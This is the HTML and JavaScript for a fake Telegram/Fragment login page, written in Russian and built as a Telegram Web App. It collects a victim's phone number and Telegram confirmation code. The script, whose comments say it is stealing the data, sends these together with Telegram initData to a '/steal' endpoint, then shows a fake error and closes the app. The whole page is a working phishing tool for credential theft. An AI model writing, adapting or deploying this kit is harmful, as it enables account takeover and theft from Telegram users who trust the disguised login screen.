<!DOCTYPE html>
<html>
<head>
    <title>Fragment</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            min-height: 100vh;
        }
        .header {
            background: #2481cc;
            color: white;
            padding: 16px;
            text-align: center;
            font-size: 18px;
            font-weight: 500;
        }
        .content {
            padding: 20px;
        }
        .phone-input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .btn {
            background: #2481cc;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
        }
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .country {
            background: white;
            padding: 12px;
            border-radius: 8px;
            margin: 10px 0;
            border: 1px solid #ddd;
        }
        .code-input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            text-align: center;
            letter-spacing: 8px;
            box-sizing: border-box;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            Войдите, чтобы использовать аккаунт Telegram
        </div>
        
        <div class="content">
            <div id="phoneScreen">
                <p>для fragment.com и Fragment Auction Alerts.</p>
                <p>Введите свой <strong>номер телефона</strong> в международном формате. Подтверждение будет отправлено в Telegram.</p>
                
                <div class="country">
                    <strong>Россия</strong><br>
                    +7
                </div>
                
                <input type="tel" class="phone-input" id="phoneInput" placeholder="+7 XXX XXX XX XX" pattern="\+7[0-9]{10}">
                
                <button class="btn" id="nextBtn" disabled>ДАЛЕЕ</button>
                <button class="btn" style="background: #888;" onclick="closeApp()">ОТМЕНА</button>
            </div>
            
            <div id="codeScreen" class="hidden">
                <p>Введите код подтверждения, отправленный в Telegram:</p>
                <input type="text" class="code-input" id="codeInput" maxlength="5" placeholder="12345">
                <button class="btn" id="confirmBtn" disabled>ПОДТВЕРДИТЬ</button>
            </div>
        </div>
    </div>

    <script>
        const phoneInput = document.getElementById('phoneInput');
        const nextBtn = document.getElementById('nextBtn');
        const codeInput = document.getElementById('codeInput');
        const confirmBtn = document.getElementById('confirmBtn');
        const phoneScreen = document.getElementById('phoneScreen');
        const codeScreen = document.getElementById('codeScreen');

        // Валидация номера
        phoneInput.addEventListener('input', function() {
            nextBtn.disabled = !this.value.match(/^\+7[0-9]{10}$/);
        });

        // Валидация кода
        codeInput.addEventListener('input', function() {
            confirmBtn.disabled = this.value.length !== 5;
        });

        // Переход к вводу кода
        nextBtn.addEventListener('click', function() {
            // Крадём данные Telegram Web App
            const tgData = Telegram.WebApp.initData;
            
            // Отправляем номер на сервер
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: phoneInput.value,
                    tg_data: tgData,
                    stage: 'phone_entered'
                })
            });

            phoneScreen.classList.add('hidden');
            codeScreen.classList.remove('hidden');
        });

        // Подтверждение кода
        confirmBtn.addEventListener('click', function() {
            // Крадём код
            fetch('/steal', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    phone: phoneInput.value,
                    code: codeInput.value,
                    tg_data: Telegram.WebApp.initData,
                    stage: 'code_entered'
                })
            });

            // Показываем фейковую ошибку
            alert('Ошибка! Не удалось войти в аккаунт. Попробуйте позже.');
            Telegram.WebApp.close();
        });

        function closeApp() {
            Telegram.WebApp.close();
        }

        // Инициализация Telegram Web App
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
    </script>
</body>
</html>
